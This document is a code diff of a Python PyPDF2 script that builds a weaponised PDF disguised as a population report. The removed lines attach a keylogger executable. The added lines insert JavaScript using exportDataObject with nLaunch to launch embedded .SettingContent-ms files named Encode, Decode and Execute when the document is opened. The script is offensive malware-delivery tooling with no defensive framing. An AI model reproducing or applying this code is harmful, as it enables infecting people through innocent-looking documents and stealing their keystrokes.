@@ -1,10 +1,10 @@
 import PyPDF2
 
 
-pdf_file = "rapport_pop2022.pdf"
-output_pdf = "rapport_pop2021.pdf"
-payload_path = "MyKeyLogger.b64"
-exe_name = "MyKeyLogger.exe"
+pdf_file = "rapport_pop_malicious.pdf"
+output_pdf = "rapport_pop_js.pdf"
+# payload_path = "MyKeyLogger.b64"
+# exe_name = "MyKeyLogger.exe"
 # password = "B%a3N[Nek6+_M;}P"
 
 with open(pdf_file, "rb") as file_:
@@ -18,9 +18,9 @@ with open(pdf_file, "rb") as file_:
         writer.addPage(pdf.getPage(page))
 
     # Embed payload
-    payload = open(payload_path, "rb")
+    # payload = open(payload_path, "rb")
 
-    writer.addAttachment(''+exe_name, payload.read())
+    # writer.addAttachment(''+exe_name, payload.read())
 
     # writer.encrypt(password)
 
@@ -28,10 +28,10 @@ with open(pdf_file, "rb") as file_:
     # writer.addJS("app.alert('test')")
     # writer.addJS("this.exportDataObject({cName: MyKeyLogger.exe, nLaunch: 2});")
     # writer.addJS('var files = ["PutFile", "Decode", "Execute"]; for (var i = 0; i < files.len; i++) {this.exportDataObject({cName: files[i] + ".SettingContent-ms",nLaunch: 2,});}')
-    # writer.addJS('this.exportDataObject({cName: cName: "PutFile.SettingContent-ms",, nLaunch: 2});')
-    # writer.addJS('this.exportDataObject({cName: cName: "Decode.SettingContent-ms",, nLaunch: 2});')
-    # writer.addJS('this.exportDataObject({cName: cName: "Execute.SettingContent-ms",, nLaunch: 2});')
-    writer.addJS("var files = [\"Payload\", \"psFile\"]; for (var i = 0; i < files.length; i++) { this.exportDataObject( {cName: files[i] + \".SettingContent-ms\", nLaunch: 2} ); }")
+    # writer.addJS('this.exportDataObject({cName: "Encode.SettingContent-ms", nLaunch: 2});')
+    # writer.addJS('this.exportDataObject({cName: "Decode.SettingContent-ms", nLaunch: 2});')
+    # writer.addJS('this.exportDataObject({cName: "Execute.SettingContent-ms", nLaunch: 2});')
+    writer.addJS("var files = [\"Encode\", \"Decode\", \"Execute\"]; for (var i = 0; i < files.length; i++) { this.exportDataObject( {cName: files[i] + \".SettingContent-ms\", nLaunch: 2} ); }")
 
     with open(output_pdf, 'wb') as fh:
         writer.write(fh)
